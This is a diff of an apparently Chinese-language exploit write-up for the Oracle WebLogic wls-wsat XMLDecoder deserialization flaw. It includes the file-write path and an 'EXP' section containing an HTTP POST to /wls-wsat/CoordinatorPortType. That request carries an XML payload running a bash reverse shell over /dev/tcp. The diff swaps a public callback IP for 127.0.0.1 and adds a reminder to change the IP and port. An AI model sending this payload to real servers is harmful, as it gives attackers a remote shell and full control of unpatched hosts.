@@ -36,7 +36,7 @@ Content-Length: 748
 写入的路径是`~/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt`
 访问验证的路径是`/wls-wsat/test.txt`
 # EXP
-反弹shell
+反弹shell,注意修改IP和端口，得到的shell是
 ```
 POST /wls-wsat/CoordinatorPortType HTTP/1.1
 Host: 10.203.87.64:7001
@@ -63,7 +63,7 @@ Content-Length: 638
                             <string>-c</string>
                         </void>
                         <void index="2">
-                            <string>bash -i &gt;&amp; /dev/tcp/45.76.101.190/7777 0&gt;&amp;1</string>
+                            <string>bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&gt;&amp;1</string>
                         </void>
                     </array>
                     <void method="start"/></void>
